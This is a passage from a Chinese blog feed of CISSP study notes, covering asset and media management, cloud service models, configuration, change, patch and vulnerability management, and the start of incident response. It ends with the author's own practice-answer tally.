href="#16-3-1-信息和资产所有权" class="headerlink" title="16.3.1 信息和资产所有权"></a>16.3.1 信息和资产所有权</h2><p>数据所有者对数据担负最终组织责任。</p><p>高级管理人员对其他资产（如硬件资产）负有最终责任。</p><h2 id="16-3-2-资产管理"><a href="#16-3-2-资产管理" class="headerlink" title="16.3.2 资产管理"></a>16.3.2 资产管理</h2><p>资产管理是指管理有形资产和无形资产。</p><p>资产管理通常从资产清单开始，要求跟踪资产，采取额外措施在整个生命周期内保护资产。</p><p>有形资产：硬件资产和软件资产</p><p>无形资产：专利、版权、公司声誉和其他代表潜在收入的资产。</p><h3 id="1-硬件资产清单"><a href="#1-硬件资产清单" class="headerlink" title="1. 硬件资产清单"></a>1. 硬件资产清单</h3><p>自动配置管理系统（configuration management system，CMS）管理硬件资产。</p><p>CMS 目的是配置管理，需要连接到硬件系统。</p><p>硬件资产包括：计算机、服务器、路由器、交换机和外围设备等 IT 资源。</p><p>使用数据库和库存应用程序在整个设备生命周期内执行资产盘点和跟踪硬件资产。</p><p>常见方法：</p><p>条形码</p><p>射频识别（radio frequency identification，RFID）标签</p><p>RFID 更昂贵，可以明显减少资产盘点所需的时间。</p><h4 id="净化（sanitize）"><a href="#净化（sanitize）" class="headerlink" title="净化（sanitize）"></a>净化（sanitize）</h4><p>净化设备的操作会删除设备上的所有数据，确保未授权的人员无法访问敏感信息。</p><p>需要使用检查表 checklist 清理系统。</p><p>检查表包含对系统内各类介质的净化步骤，净化对象包括系统内置硬盘、非易失性存储器，以及 CD、DVD 和 USB 闪存驱动器等可移动介质</p><p>保存敏感数据的便携式介质也可以作为资产进行管理。</p><h3 id="2-软件资产清单"><a href="#2-软件资产清单" class="headerlink" title="2. 软件资产清单"></a>2. 软件资产清单</h3><p>软件资产包括操作系统和应用程序。</p><p>使用许可密钥（license key）来激活软件。</p><p>激活往往需要连接互联网许可服务器，以防止盗版行为。</p><p>应该监测软件的许可合规来规避法律纠纷。</p><p>软件许可可以确保系统没有按照未经授权的软件。</p><h3 id="3-无形资产清单"><a href="#3-无形资产清单" class="headerlink" title="3. 无形资产清单"></a>3. 无形资产清单</h3><p>需要跟踪无形资产并加以保护。</p><p>高级管理团队通常是无形资产的所有者。</p><p>评估资产为组织带来的收益来确定无形资产的价值。</p><p>公认会计原则（GAAP）在其资产负债表上报告无形资产的价值。</p><p>组织至少每年审查一次无形资产。</p><h1 id="16-4-实施资源保护"><a href="#16-4-实施资源保护" class="headerlink" title="16.4 实施资源保护"></a>16.4 实施资源保护</h1><p>组织应用各种资源保护技术来确保在整个生命周期内安全配置和管理资源。</p><h2 id="16-4-1-媒介管理"><a href="#16-4-1-媒介管理" class="headerlink" title="16.4.1 媒介管理"></a>16.4.1 媒介管理</h2><p>媒介管理是指为保护媒介及其存储数据而采取的步骤。</p><p>媒介泛指任何可存储数据的设备。</p><p>智能手机也属于媒介。</p><p>媒介管理不仅涵盖备份磁带，还包括任何存储数据的介质类型，还包括任何类型的硬拷贝数据。</p><h2 id="16-4-2-媒介保护技术"><a href="#16-4-2-媒介保护技术" class="headerlink" title="16.4.2 媒介保护技术"></a>16.4.2 媒介保护技术</h2><p>存储在严格访问控制的安全场所，安全场所需要具备温度和湿度的控制措施。</p><p>媒介管理包括技术控制措施，以限制计算机系统对媒介的访问，例如：禁止使用 USB</p><p>正确的媒介管理可以直接解决保密性、完整性和可用性问题。</p><p>正确标记、处理和保管媒介时，可以防止未经授权的泄露（保密性破坏）、未经授权的修改（完整性破坏）和未经授权的破坏（可用性破坏）。</p><h3 id="1-磁带媒介"><a href="#1-磁带媒介" class="headerlink" title="1. 磁带媒介"></a>1. 磁带媒介</h3><p>数据备份存储在磁盘上。</p><p>至少保留两份数据备份，一份保留在本地，一份保存在异地。</p><p>管理磁带媒介的实用指南：</p><ul><li>如果不需要使用，应该将新媒介保管在原始密封包装中。</li><li>打开媒介包装时，务必小心，不要损坏介质，包括避免碰到尖锐物体，不扭曲或弯曲磁带媒介。</li><li>避免把磁带媒介暴露在极端温度下；不要靠近加热器、散热器、空调或其他极端温度源。</li><li>请勿使用损坏的、暴露在超标尘垢中或摔过的媒介。</li><li>应该使媒介免受外界环境的影响；避开阳光、潮气、高温和低温。媒介使用前应该放置 24 小时来适应环境。</li><li>从出发点到安全的场外存储设施，应该保证媒介的适当安全。在运输过程中，介质容易遭受损坏和盗窃。</li><li>应该根据介质存储数据的分类等级，保证媒介在整个生命周期内的安全。</li><li>应该考虑对备份数据加密，防止在备份磁带丢失或被盗时造成数据泄露。</li></ul><h3 id="2-移动设备"><a href="#2-移动设备" class="headerlink" title="2. 移动设备"></a>2. 移动设备</h3><p>移动设备包括智能手机和平板电脑，移动设备配置了内置存储或移动存储卡。</p><p>带有附件、联系人和日程信息的电子邮件也是数据。</p><p>谨记移动设备拥有数据存储功能，如果移动设备存储敏感数据，务必采取措施保护。</p><h3 id="3-媒介管理生命周期"><a href="#3-媒介管理生命周期" class="headerlink" title="3. 媒介管理生命周期"></a>3. 媒介管理生命周期</h3><p>所有媒介都拥有一个有用但有限的生命周期。</p><p>可重复使用的媒介会受到平均故障时间（mean time to failure，MTTF）的影响。</p><p>许多因素会影响媒介使用寿命，并可能降低预期指标。</p><p>务必监控备份是否出现错误，如果开始出现错误，就应该替换。</p><p>备份媒介一旦达到平均故障时间，就应该被销毁。</p><p>磁带存储数据的密级决定媒介销毁的方法。</p><p>高密级磁带进行消磁，然后存放进行销毁（散装粉碎机或焚烧炉中进行销毁）</p><p>消磁操作不会删除 SSD 存储的数据，内置的擦除命令也不会清理整个硬盘。</p><p>不要删除数据，应该销毁 SSD 。</p><p>MTTF（平均故障时间） 的计算通常针对出现故障时无法修复的项目。</p><p>MTBF（平均故障间隔时间）的计算是项目两个可修复故障之间的时间间隔。</p><h1 id="16-5-云托管服务"><a href="#16-5-云托管服务" class="headerlink" title="16.5 云托管服务"></a>16.5 云托管服务</h1><p>基于云的资产包括一个组织使用云计算访问的任何资源。</p><p>云计算是指可以按需访问的计算资源，云计算资源具有高可用性和易扩展性。</p><p>租用和本地部署优缺点：<br>租用优点可以提供便利，但是不受组织的直接控制。</p><p>本地部署可以有更大的控制权。</p><p>在云上存储数据时，必须确保安全控制到位。</p><p>所有敏感数据都应该加密，包括发送到云上的传输数据和存储在云上的静态数据。</p><p>云租户应该对加密进行管理，包括掌控所有加密密钥，而不是使用云服务商掌握的加密措施。</p><p>使用加密擦除方法来销毁数据。</p><p>加密擦除方法永久删除加密密钥。</p><h2 id="16-5-1-使用云服务模型分担责任"><a href="#16-5-1-使用云服务模型分担责任" class="headerlink" title="16.5.1 使用云服务模型分担责任"></a>16.5.1 使用云服务模型分担责任</h2><p>根据云服务模式不同，资产维护和安全责任程度也不相同，包括维护资产，确保资产功能，以及使用系统和应用程序与当前补丁保持同步。</p><p><img src="/2024/12/24/informationCocoon/tk_group_message/%E5%AE%89%E5%85%A8%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%B7%A5%E7%A8%8B+%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E7%AE%A1%E7%90%86/image-20250610192135962.png" alt="image-20250610192135962"></p><h3 id="软件即服务（software-as-a-service-SaaS）"><a href="#软件即服务（software-as-a-service-SaaS）" class="headerlink" title="软件即服务（software  as a service ,SaaS）"></a>软件即服务（software  as a service ,SaaS）</h3><p>提供通常可通过 Web 浏览器访问的全功能应用程序。</p><p>用户不需要管理或控制任何云资产。</p><h3 id="平台即服务（platform-as-a-service，PaaS）"><a href="#平台即服务（platform-as-a-service，PaaS）" class="headerlink" title="平台即服务（platform as a service，PaaS）"></a>平台即服务（platform as a service，PaaS）</h3><p>为用户提供一个计算平台，包括硬件、操作系统和运行时环境。</p><p>云服务提供商负责维护主机和底层云基础架构。</p><h3 id="基础架构即服务（infrastructure-as-a-service，IaaS）"><a href="#基础架构即服务（infrastructure-as-a-service，IaaS）" class="headerlink" title="基础架构即服务（infrastructure as a service，IaaS）"></a>基础架构即服务（infrastructure as a service，IaaS）</h3><p>为用户提供基本的计算资源。</p><p>资源包括服务器、存储和网络资源。</p><p>操作系统、应用程序需要用户部署维护。</p><h3 id="4-种云部署模型"><a href="#4-种云部署模型" class="headerlink" title="4 种云部署模型"></a>4 种云部署模型</h3><ul><li><p><strong>公有云模型</strong>：</p><p>可供任何用户租用或租赁的资产，资产由外部云服务提供商（CSP）托管。</p><p>服务水平协议可以有效地确保 CSP 服务水平。</p></li><li><p><strong>私有云模型</strong>：</p><p>适用于单个组织的云资产。</p><p>组织可以使用自有资源创建和托管私有云。</p><p>组织负责所有维护工作。</p><p>也可以从第三方租用资源，维护要求根据服务模型（SaaS、PaaS 或 IaaS）进行拆分。</p></li><li><p>社区云模型：</p><p>为两个或多个共同关切的组织（例如有类似的任务、安全要求、策略）提供云资产。</p><p>云资产由一个或多个组织拥有和管理。</p><p>维护责任根据资产托管方和服务模型进行分配。</p></li><li><p>混合云模型：</p><p>两个或多个云的组合</p><p>混合云由一种提供数据和程序迁移的技术结合在一起。</p><p>与社区云模型类似。</p><p>维护责任根据资产托管方和服务模型进行分配。</p></li></ul><h2 id="16-5-2-可扩展性和弹性"><a href="#16-5-2-可扩展性和弹性" class="headerlink" title="16.5.2 可扩展性和弹性"></a>16.5.2 可扩展性和弹性</h2><p>可扩展性是指系统通过扩充附加资源来处理超过载荷的能力。</p><p>弹性是指系统根据负载的增加和减少来动态添加或削减资源的能力。</p><p>关键点：</p><p>弹性方法不需要通过关闭系统来添加资源，资源可以自动添加或删除。</p><p>可扩展性方法不是自动或动态的，需要手动干预。</p><h1 id="16-6-开展配置管理"><a href="#16-6-开展配置管理" class="headerlink" title="16.6 开展配置管理"></a>16.6 开展配置管理</h1><p>配置管理（configuration management，CM）有助于确保系统在安全一致的状态中部署，并在整个生命周期内保持安全一致的状态。</p><p>基线和镜像通常用于部署系统。</p><h2 id="16-6-1-配置"><a href="#16-6-1-配置" class="headerlink" title="16.6.1 配置"></a>16.6.1 配置</h2><p>配置新系统是指安装和配置操作系统及所需的应用程序。</p><p>默认设置部署会形成很多漏洞，需要配置减少漏洞。</p><p>基于使用情况对系统进行加固。</p><p>加固内容包括以下：</p><ul><li>禁用所有未使用的服务。</li><li>关闭所有未使用的逻辑端口。</li><li>删除所有未使用的应用程序。</li><li>更改默认口令。</li></ul><h2 id="16-6-2-基线"><a href="#16-6-2-基线" class="headerlink" title="16.6.2 基线"></a>16.6.2 基线</h2><p>基线是指起点。</p><p>基线是指系统初始配置，也就是配置列表。</p><p>操作系统基线识别所有配置，以加固特定系统。</p><p>基线提供安全起点，管理员根据不同需求对基线进行修改。</p><h2 id="16-6-3-使用镜像技术创建基线"><a href="#16-6-3-使用镜像技术创建基线" class="headerlink" title="16.6.3 使用镜像技术创建基线"></a>16.6.3 使用镜像技术创建基线</h2><p>创建和部署基线镜像的 3 个步骤</p><p>（1）管理员在计算机上安装操作系统和所需的应用程序。</p><p>管理员配置系统，使其满足组织安全要求。</p><p>员工执行全面的测试，确保系统能够按照预期运行。</p><p>（2）管理员使用镜像软件捕获系统镜像，并存储在镜像服务器&#x2F;外部硬盘&#x2F;USB&#x2F;DVD 等中。</p><p>（3）员工根据组织需要将镜像部署到具体系统。再根据需要进行额外的配置。</p><p>基线镜像优势</p><ul><li>确保系统所需安全配置总能正确配置，提高系统安全性</li><li>缩减系统部署和维护所需时间，降低了总体维护成本。</li></ul><p>组织通常会保护基线镜像，确保不被任意修改。</p><h2 id="16-6-4-自动化"><a href="#16-6-4-自动化" class="headerlink" title="16.6.4 自动化"></a>16.6.4 自动化</h2><p>镜像通常和其他基线自动化方法相结合。</p><p>微软操作系统包括组策略，管理员可以配置组策略，自动将组策略应用到域内所有计算机</p><p>管理员可以控制组策略设置来修改相应的注册表设置，例如：检测 powershell 攻击，开启日志记录等。</p><h1 id="16-7-管理变更"><a href="#16-7-管理变更" class="headerlink" title="16.7 管理变更"></a>16.7 管理变更</h1><p>在安全状态部署系统的基础上，需要确保系统保持相同的安全级别。</p><p>变更管理可减少因为未授权的更改而导致的意外中断。</p><p>变更管理的<strong>主要目标</strong>是保证变更不会导致意外中断。</p><p>变更管理流程需要对变更进行审核和批准，确保对变更进行测试和记录。</p><p>变更往往引发可能造成中断的意外副作用。</p><p>变更管理帮助组织花时间评估削弱安全性的风险。</p><p>未经授权的变更会直接影响 CIA 三元组中的 A ，也就是可用性。</p><p>一些变更可能削弱或降低安全性。</p><h2 id="16-7-1-变更管理"><a href="#16-7-1-变更管理" class="headerlink" title="16.7.1 变更管理"></a>16.7.1 变更管理</h2><p>变更管理流程确保员工执行安全影响分析。</p><p>变更管理控制提供了一种流程，以控制、记录、跟踪和审计所有系统变更。包括硬件和软件的配置。</p><p>变更管理流程常见步骤：</p><p><strong>（1）请求变更</strong></p><p>内部网站上员工提交变更请求，自动记录变更请求，便于员工追踪变更。</p><p>允许所有员工查看变更请求的状态。</p><p><strong>（2）审核变更</strong></p><p>专家审核变更，审核人员来自组织的不同领域。</p><p>可能很快完成审核，可能需要多次测试经过变更审核委员会批准。</p><p><strong>（3）批准&#x2F;拒绝变更</strong></p><p>专家根据审核结果批准或拒绝变更。</p><p>专家在变更管理文档中记录答复。</p><p>需要创建回滚或退出计划以确保可以恢复到原始状态。</p><p><strong>（4）测试变更</strong></p><p>变更申请批准后，需要对变更进行测试。</p><p>测试在非生产环境中，测试有助于提前发现问题。</p><p><strong>（5）安排并实施变更</strong></p><p>使变更对系统和用户造成的影响最小化。</p><p>变更可以安排到休班或非高峰时间。</p><p><strong>（6）记录变更</strong></p><p>记录变更，确保所有相关方知悉变更。</p><p>记录变更需要修改配置管理文档。</p><p>变更管理文档会提供有关变更的信息，帮助管理员快速恢复到变更之前。</p><p>实施紧急变更，也需要记录变更。</p><p>需要为所有变更创建文档。文档有助于在撤销变更时提供信息，在实施相同变更时，提供变更流程。</p><p>变更管理控制是 ISO 通用标准中的一些安全保障要求（security assurance requirement，SAR）的强制性内容。</p><p>变更管理控制通过防止引发意外损失的未经授权变更来提高安全性。</p><h2 id="16-7-1-版本控制"><a href="#16-7-1-版本控制" class="headerlink" title="16.7.1 版本控制"></a>16.7.1 版本控制</h2><p>版本控制通常指软件配置管理所使用的版本控制。</p><p>通过标签或编号系统。</p><p>版本控制有助于追踪部署软件随时间的变更。</p><p>如果不通过某种版本控制系统来控制变更，所实施的变更可能会极大的破坏网站。</p><h2 id="16-7-2-配置文档"><a href="#16-7-2-配置文档" class="headerlink" title="16.7.2 配置文档"></a>16.7.2 配置文档</h2><p>配置文档明确系统的当前配置。</p><p>配置文档明确系统的负责人以及系统的目的，并列出应用于基线的所有变更。</p><h1 id="16-8-管理补丁和减少漏洞"><a href="#16-8-管理补丁和减少漏洞" class="headerlink" title="16.8 管理补丁和减少漏洞"></a>16.8 管理补丁和减少漏洞</h1><p>补丁管理确保系统已安装合适的补丁。</p><p>漏洞管理帮助验证系统能否防御已知威胁的攻击。</p><h2 id="16-8-1-系统管理"><a href="#16-8-1-系统管理" class="headerlink" title="16.8.1 系统管理"></a>16.8.1 系统管理</h2><p>补丁和漏洞管理适用于工作站、服务器、所有运行操作系统的计算设备。</p><p>嵌入式系统是指配备中央处理单元（CPU）、运行操作系统以及安装应用程序的设备。</p><p>嵌入式系统也被称为物联网 （IoT）</p><p>嵌入式系统设备也可能存在需要修补的漏洞。</p><p>嵌入式设备也应该安装补丁防止攻击再现。</p><p>移动设备也应该纳入管理。</p><p>移动设备管理软件可以将补丁部署到移动设备。</p><h2 id="16-8-2-补丁管理"><a href="#16-8-2-补丁管理" class="headerlink" title="16.8.2 补丁管理"></a>16.8.2 补丁管理</h2><p>补丁是纠正程序缺陷及漏洞，或提高现有软件性能的所有代码类型的总称。</p><p>补丁有时被称为更新、快速修复（quick fix）和热补丁（hot fix）</p><p>管理员主要关注影响系统漏洞的安全补丁。</p><p>安全补丁需要安装后才能起作用。</p><p>有效的补丁管理程序可以确保系统与当前补丁保持同步。</p><p>有效的补丁管理程序步骤：</p><p><strong>评估补丁</strong></p><p>当供应商公布或发布补丁时，管理员会对补丁进行评估，确定其是否适用于维护的系统。</p><p>不同系统补丁不一定相同，没有安装某个功能，就不需要安装对应功能的补丁。</p><p><strong>测试补丁</strong></p><p>管理员应该尽可能在隔离的非生产系统上测试补丁，确定补丁是否会导致任何不必要的副作用。</p><p><strong>审批补丁</strong></p><p>测试补丁，确认补丁是安全的，批准补丁的部署，使用变更管理流程。</p><p><strong>部署补丁</strong></p><p>测试和审批后，部署补丁，可以使用自动化方法部署补丁。</p><p><strong>验证补丁是否已完成部署</strong></p><p>补丁部署后，需要定期测试和审计系统，确保系统保持更新状态。</p><p>部署工具存在审计系统功能，漏洞评估工具也可以检查系统是否安装合适的补丁。</p><h2 id="16-8-3-漏洞管理"><a href="#16-8-3-漏洞管理" class="headerlink" title="16.8.3 漏洞管理"></a>16.8.3 漏洞管理</h2><p>漏洞管理是指定期识别漏洞、评估漏洞并采取措施减轻漏洞相关的风险。</p><p>消除风险是不可能的。</p><p>消灭所有漏洞也是不可能的。</p><p>有效的漏洞管理计划有助于组织定期评估漏洞，并抑制代表最大风险的漏洞。</p><p>漏洞管理计划常见两个要素是：日常漏洞扫描、定期漏洞评估。</p><h2 id="16-8-4-漏洞扫描"><a href="#16-8-4-漏洞扫描" class="headerlink" title="16.8.4 漏洞扫描"></a>16.8.4 漏洞扫描</h2><p>漏洞扫描器是测试系统和网络是否存在已知安全问题的软件工具。</p><p>漏洞扫描列举系统中所有的漏洞。</p><p>攻击者使用漏洞扫描器来检测系统和网络的脆弱点。</p><p>管理员也使用漏洞扫描器进行检测，目的是在攻击者发现之前检测到漏洞，并完成修补。</p><p>扫描器具备生产报告的功能，报告会显示发现的所有漏洞。</p><p>报告会提供处理建议，例如建议安装补丁（需要采取措施安装补丁），修改特定配置或安全设置。</p><p>补丁修复不可行或不可取的情况，管理层可以选择接受风险，但是扫描器会定期报告该漏洞。</p><p>实施控制措施后仍然存在的风险就是剩余风险，剩余风险产生的损失都是管理层的责任。</p><h2 id="16-8-5-常见漏洞和披露"><a href="#16-8-5-常见漏洞和披露" class="headerlink" title="16.8.5 常见漏洞和披露"></a>16.8.5 常见漏洞和披露</h2><p>漏洞通常使用“通用漏洞和披露”（CVE）字典来标识。</p><p>CVE 字典提供了漏洞标识的标准。</p><p>CVE 数据库由 MITRE 维护。</p><h1 id="16-9-本章小结"><a href="#16-9-本章小结" class="headerlink" title="16.9 本章小结"></a>16.9 本章小结</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="16-10-考试要点"><a href="#16-10-考试要点" class="headerlink" title="16.10 考试要点"></a>16.10 考试要点</h1><h2 id="了解因需可知和最小特权原则之间的区别"><a href="#了解因需可知和最小特权原则之间的区别" class="headerlink" title="了解因需可知和最小特权原则之间的区别"></a>了解因需可知和最小特权原则之间的区别</h2><p>因需可知和最小特权原则是安全网络环境遵循的两个标准 IT 安全原则。</p><p>因需可知和最小特权原则限制人员对数据和系统的访问，以便用户和其他主体只能访问需要的内容。</p><p>这种受限的访问有助于预防安全事件，且有助于在事件发生时限制事件的影响范围。</p><p>如果组织不遵循这些原则，安全事件将对组织造成更大的损害。</p><h2 id="理解职责分离和岗位轮换"><a href="#理解职责分离和岗位轮换" class="headerlink" title="理解职责分离和岗位轮换"></a>理解职责分离和岗位轮换</h2><p>职责分离是一项基本安全原则，确保单个的人无法掌握关键职能或关键的系统要素。</p><p>通过岗位轮换，员工可以轮换到不同的工作岗位，或者任务可以分配给不同员工。</p><p>串通是指多人协同一些未经授权的或非法的行为。</p><p>在没有出现串通的情况下，这些策略可以通过限制个人行为来预防欺诈。</p><h2 id="理解监控特权操作的重要性"><a href="#理解监控特权操作的重要性" class="headerlink" title="理解监控特权操作的重要性"></a>理解监控特权操作的重要性</h2><p>虽然特权用户是受信任的，但他们可能滥用其特权。因此，有必要监控所有特权的分配及使用。</p><p>监控特权操作的目的是确保受信任的员工不会滥用被授予的特权。</p><p>因为攻击者通常在攻击时使用特权，监视特权操作还可以检测到一些攻击。</p><p>高级特权管理可限制用户拥有高级特权的时间。</p><h2 id="理解服务水平协议"><a href="#理解服务水平协议" class="headerlink" title="理解服务水平协议"></a>理解服务水平协议</h2><p>组织与供应商等外部实体签订服务水平协议。</p><p>SLA 规定了性能期望，例如最长停机时间。</p><p>SLA 通常会包含处罚条款，以防供应商达不到预期。</p><h2 id="关注人员安全"><a href="#关注人员安全" class="headerlink" title="关注人员安全"></a>关注人员安全</h2><p>胁迫系统可使警卫在紧急情况下发出警报，应急管理计划可帮助组织应对灾难。</p><p>当员工出差时，员工需要意识到风险，特别是当出差到不同的国家时。</p><p>‘</p><p>安全配置和意识计划可确保员工了解这些风险以及减轻风险的方法。</p><h2 id="理解安全配置概念"><a href="#理解安全配置概念" class="headerlink" title="理解安全配置概念"></a>理解安全配置概念</h2><p>资源的安全配置包括确保资源以安全方式部署并在其整个生命周期中以安全方式维护。</p><p>资产管理跟踪有形资产（硬件和软件）和无形资产（如专利、商标、公司商誉和版权）。</p><h2 id="了解如何管理和保护媒介"><a href="#了解如何管理和保护媒介" class="headerlink" title="了解如何管理和保护媒介"></a>了解如何管理和保护媒介</h2><p>媒介管理技术追踪保存敏感数据的媒介。</p><p>媒介在其整个生命周期都受到保护，并在不再需要时销毁。</p><h2 id="理解-SaaS、PaaS-和-IaaS-之间的区别"><a href="#理解-SaaS、PaaS-和-IaaS-之间的区别" class="headerlink" title="理解 SaaS、PaaS 和 IaaS 之间的区别"></a>理解 SaaS、PaaS 和 IaaS 之间的区别</h2><p>软件即服务（SaaS）模型提供通常可通过 Web 浏览器访问的全功能应用程序。</p><p>平台即服务（PaaS）模型为用户提供计算平台，包括硬件、操作系统和运行时环境。</p><p>基础架构即服务（IaaS）模型提供基本的计算资源，例如服务器、存储和网络资源。</p><h2 id="识别云托管服务的安全问题"><a href="#识别云托管服务的安全问题" class="headerlink" title="识别云托管服务的安全问题"></a>识别云托管服务的安全问题</h2><p>云托管服务包括云存储或通过云访问的任何资源。</p><p>将数据存储在云中会增加风险，因此可能需要额外的措施来保护数据，具体措施取决于数据的价值。</p><p>在租赁基于云的服务时，必须了解谁负责维护和安全。</p><p>云服务提供商在 IaaS 模型中提供最少的维护和安全。</p><h2 id="解读配置和变更管理控制"><a href="#解读配置和变更管理控制" class="headerlink" title="解读配置和变更管理控制"></a>解读配置和变更管理控制</h2><p>通过有效的配置和变更管理计划，可以预防业务中断及许多其他的事件。</p><p>配置管理确保系统采用相近配置，并且系统配置是可知悉和可记录的。</p><p>基线确保所部署的系统有相同基线或相同启动点，而镜像是一种常规基线技术。</p><p>变更管理有助于预防未授权的变更，进而减少业务中断并防止削弱安全。</p><p>变更管理流程规定了变更的请求、批准、测试和记录。</p><p>版本控制使用标签或编号系统来跟踪软件版本的变更。</p><h2 id="理解补丁管理"><a href="#理解补丁管理" class="headerlink" title="理解补丁管理"></a>理解补丁管理</h2><p>补丁管理可以确保系统和当前补丁保持同步。</p><p>应该认识到有效管理补丁计划包括补丁评估、测试、批准和部署。</p><p>此外，系统审核将验证已批准的补丁是否已部署到系统。</p><p>补丁管理通常与变更和配置管理结合在一起，确保文档内容可以显示变更。</p><p>当缺少有效补丁管理计划时，组织往往会遇到因已知问题导致的中断及事件，而这些问题原本是能预防的。</p><h2 id="解读漏洞管理"><a href="#解读漏洞管理" class="headerlink" title="解读漏洞管理"></a>解读漏洞管理</h2><p>漏洞管理包括例行漏洞扫描和定期漏洞评估。</p><p>漏洞扫描器可以检测已知的安全漏洞和脆弱点，如未打补丁或使用了弱密码。</p><p>漏洞管理可以生成报告，报告可以指出系统存在的漏洞，并对补丁管理计划进行有效检查。</p><p>漏洞评估不仅涉及技术扫描，还包括漏洞检测的审查和审核。</p><h1 id="16-11-书面实验"><a href="#16-11-书面实验" class="headerlink" title="16.11 书面实验"></a>16.11 书面实验</h1><h1 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h1><p>B❌ C</p><p>​因需可知原则的基础是，任何给定的系统用户都应该被授予执行某些任务所需要的部分敏感信息或材料的访问权限。</p><p>​最小特权原则确保人员仅被授予执行工作所需的权限，而不授予其他权限</p><p>​职责分离原则确保没有单个人可以完全控制关键功能或系统</p><p>A❌ C</p><p>​因需可知是指访问、了解或拥有数据的要求，从而执行特定工作任务</p><p>​最下特权原则包括权利和权限。</p><p>A❌ C</p><p>​最小特权原则确保员工仅获得完整工作职责所需的权限和权利</p><p>​因需可知仅指权限，特权包括权利和权限</p><p>D✅</p><p>D✅</p><p>A✅</p><p>C✅</p><p>A✅</p><p>B✅</p><p>C✅</p><p>A✅</p><p>C✅</p><p>​SaaS 服务模型提供通过 Web 浏览器访问服务</p><p>​IaaS 提供基础架构，如服务器</p><p>​Paas 提供平台</p><p>A✅</p><p>C✅</p><p>BCD✅</p><p>B❌ C</p><p>​变更管理的目的是确保所有变更不会导致意外中断或降低安全性</p><p>​变更管理不会影响人员安全</p><p>​变更管理计划通常包含回滚计划，但这不是变更管理计划的具体目标。</p><p>D✅</p><p>A✅</p><p>B✅</p><p>D✅</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>17-域7安全运营+域8软件开发安全-事件的预防和响应</title>
    <link href="/2025/04/21/security/seccert/cissp/17-%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5+%E5%9F%9F8%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8-%E4%BA%8B%E4%BB%B6%E7%9A%84%E9%A2%84%E9%98%B2%E5%92%8C%E5%93%8D%E5%BA%94/"/>
    <url>/2025/04/21/security/seccert/cissp/17-%E5%9F%9F7%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5+%E5%9F%9F8%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8-%E4%BA%8B%E4%BB%B6%E7%9A%84%E9%A2%84%E9%98%B2%E5%92%8C%E5%93%8D%E5%BA%94/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>有效的事件管理可以帮助组织在攻击发生时做出响应，以限制攻击的范围。</p><p>组织可以通过预防措施抵御和检测攻击。</p><p>日志记录和监控可确保安全控制措施到位，并提供所需的保护。</p><h1 id="17-1-实施事件管理"><a href="#17-1-实施事件管理" class="headerlink" title="17.1 实施事件管理"></a>17.1 实施事件管理</h1><p>任何安全方案都以预防安全事件作为主要目标之一。</p><p>事件管理的主要目标是将组织受到的影响降至最低。</p><h2 id="17-1-1-事件的定义"><a href="#17-1-1-事件的定义" class="headerlink" title="17.1.1 事件的定义"></a>17.1.1 事件的定义</h2><p>事件一般指会对组织资产的保密性、完整性或可用性产生负面影响的任何事情。包含各种事件，自然灾害、意外事件等。</p><p>计算机安全事件（安全事件）通常是指由攻击导致的事件，或由用户的恶意或蓄意行为导致的事件。</p><p>常见安全事件例子：</p><ul><li>任何未遂的网络入侵</li><li>任何未遂的拒绝服务攻击</li><li>对恶意软件的任何检测</li><li>对数据的任何未经授权的访问</li><li>对安全策略的任何违背行为</li></ul><h2 id="17-1-1-事件管理步骤"><a href="#17-1-1-事件管理步骤" class="headerlink" title="17.1.1 事件管理步骤"></a>17.1.1 事件管理步骤</h2><p>事件管理是一种持续开展的活动，“总结教训”阶段的结果将用来改进检测方法或帮助防止事件在未来反复发生。</p><p>检测 -&gt; 响应 -&gt; 抑制 -&gt; 报告 -&gt; 恢复 -&gt; 补救 -&gt; 总结教训</p><p><img src="/2024/12/24/informationCocoon/tk_group_message/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8-%E4%BA%8B%E4%BB%B6%E7%9A%84%E9%A2%84%E9%98%B2%E5%92%8C%E5%93%8D%E5%BA%94/image-20250611090142252.png" alt="image-20250611090142252"></p><p>事件管理不包含对攻击者的反击，反击会适得其反。</p><p>反击存在违法、打击无辜者的风险。</p><h3 id="1-检测"><a href="#1-检测" class="headerlink" title="1. 检测"></a>1. 检测</h3><p>检测潜在事件的方法：</p><ul><li>入侵检测和预防系统</li><li>反恶意软件在检测到恶意软件时会弹出警告窗口</li><li>自动化工具定期扫描审计日志，以找出预先定义好的事件。检测到后会向管理员发出警报。</li><li>最终用户会检测到非常规活动并对技术人员或管理员求助</li></ul><p>IT  人员需要对检测到的事件进行调查判断是否真实。</p><p>IT  人员需要经过专门培训区分问题和安全事件。</p><p>确认为安全事件后，将进入下一步骤响应。</p><h3 id="2-响应"><a href="#2-响应" class="headerlink" title="2. 响应"></a>2. 响应</h3><p>响应因事件严重程度而异。</p><p>专门的事件响应团队，处理重大安全事件。<br>计算机事件响应团队 CIRT</p><p>计算机安全事件响应团队  CSIRT</p><p>组织对事件响应的速度越快，把损害控制在有限范围的机会就越大。</p><p>务必在调查过程中保护好可以充当证据的所有数据。</p><p>计算机涉及安全事件时不可关闭，关闭会导致 RAM 中的数据丢失。</p><h3 id="3-抑制"><a href="#3-抑制" class="headerlink" title="3. 抑制"></a>3. 抑制</h3><p>抑制措施目的在于遏制事件的发展。</p><p>有效事件管理的主要目的之一是限制事件的影响和范围。</p><p>可以在不让攻击者知道攻击已被发现的情况下采取措施抑制事件。</p><p>监控攻击者的行为并确定攻击范围。</p><h3 id="4-报告"><a href="#4-报告" class="headerlink" title="4. 报告"></a>4. 